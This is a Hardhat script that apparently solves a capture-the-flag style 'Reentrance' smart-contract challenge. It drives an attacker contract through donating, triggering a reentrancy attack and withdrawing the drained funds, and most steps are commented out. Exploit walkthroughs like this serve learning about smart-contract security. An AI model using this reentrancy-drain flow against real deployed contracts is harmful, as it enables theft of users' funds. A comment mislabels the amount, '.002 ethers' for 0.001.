import { ethers } from "hardhat";
import { wrapEthersProvider } from "hardhat-tracer";
const CONTRACT_ADDRESS = "0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x477c33D6E3dDc8E407818FF28137159dE4439F82";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Reentrance",
    CONTRACT_ADDRESS,
    signer
  );
  // const attackerContractFactory = await ethers.getContractFactory(
  //   "Attacker",
  //   signer
  // );

  // const attackerContract = await attackerContractFactory.deploy();

  // console.log(attackerContract);

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  const eth001 = "1000000000000000"; // .002 ethers

  // step 1: Call the donate function to register contract address
  // const donateToVictimTX = await attackerContract.donateToVictim({
  //   value: eth001,
  // });

  // Display donateToVictim Transaction
  // console.log(donateToVictimTX);
  //step 2: validate the contract has .002 eth in it's contract balance holdings
  // const viewBalanceOfTX = await contract.balanceOf(ATTACKER_CONTRACT);

  // console.log(
  //   "the balance of the attacker contract should be .001 eth and it is:  ",
  //   viewBalanceOfTX
  // );
  // step: 3: Trigger the re-entrency call
  // const attackTX = await attackerContract.attack();

  // console.log(attackTX);

  // Step 4: view balance of contract
  // view balance of the contract after attack
  // const contractBalanceTX = await ethers.provider.getBalance(CONTRACT_ADDRESS);

  // console.log(`The balance of the reentrence contract is ${contractBalanceTX}`);

  // step 5: remove all funds and return to original wallet
  console.log(await attackerContract.withdrawToCaller());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
